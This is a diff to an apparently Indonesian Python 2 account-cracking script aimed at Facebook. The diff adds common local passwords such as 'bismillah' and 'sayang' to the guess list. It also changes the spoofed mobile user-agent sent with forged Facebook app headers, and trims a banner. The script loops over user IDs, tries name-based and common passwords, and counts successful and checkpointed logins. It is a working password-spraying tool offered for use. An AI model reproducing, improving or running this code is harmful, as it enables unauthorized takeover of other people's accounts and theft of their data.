@@ -63,17 +63,6 @@ def __raka_sayang_amanda__():
         else:
 		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input")
 _raka_banner_ = ("""
-\033[0;31m         @@@  @@@        @@@@@@   @@@  @@@       @@@  @@@  
-\033[0;31m        @@@  @@@       @@@@@@@@  @@@  @@@       @@@  @@@  
-\033[0;32m       @@!  @@!       @@!  @@@  @@!  @@@       @@!  @@@  
-\033[0;32m      !@!  !@!       !@!  @!@  !@!  @!@       !@!  @!@  
-\033[0;33m     !!@  @!!       @!@  !@!  @!@  !@!       @!@  !@!  
-\033[0;33m    !!!  !!!       !@!  !!!  !@!  !!!       !@!  !!!  
-\033[0;36m   !!:  !!:       !!:  !!!  :!:  !!:       !!:  !!!  
-\033[0;36m  :!:   :!:      :!:  !:!   ::!!:!        :!:  !:!  
-\033[0;35m  ::   :: ::::  ::::: ::    ::::         ::::: ::  
-\033[0;35m:    : :: : :   : :  :      :            : :  :                                                             
-\033[0;36m_______________________________________________________\n
 \033[0;31m       $$$$$$$$\ $$\                             $$$$$$$\  
 \033[0;31m      $$  _____|$$ |                            $$  __$$\ 
 \033[0;32m     $$ |      $$ | $$$$$$\   $$$$$$\          $$ |  $$ |
@@ -166,7 +155,7 @@ def __menu__():
 		global ok,cp,ua, loop
 		results = []
 		__warna_warni__ = random.choice(['\033[0;33m','\033[0;36m','\033[0;90m','\033[0;35m','\033[0;31m','\033[0;00m'])
-		print __warna_warni__+'\r [%s] %s/%s [Ok:%s] - [Cp:%s] ' % (datetime.now().strftime('%H:%M:%S'),loop, len(id), len(ok), len(cp)),
+		print __warna_warni__+'\r[%s] %s/%s [Ok:%s] - [Cp:%s] ' % (datetime.now().strftime('%H:%M:%S'),loop, len(id), len(ok), len(cp)),
 		sys.stdout.flush()
 		uid = arg
 		try:
@@ -184,12 +173,16 @@ def __menu__():
 			results.append(last+'1234')
 			results.append(last+'12345')
 			results.append(last+'123456')
+			results.append('bismillah')
+			results.append('sayang')
+			results.append('anjing')
+			results.append('indonesia')
 			for pw in results:
 				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
 				'x-fb-net-hni': str(random.randint(20000, 40000)), 
 				'x-fb-connection-quality': 'EXCELLENT', 
 				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-				'user-agent': 'BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103',
+				'user-agent': 'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125',
 				'content-type': 'application/x-www-form-urlencoded',
 				'x-fb-http-engine': 'Liger'}
 				ses=requests.Session()
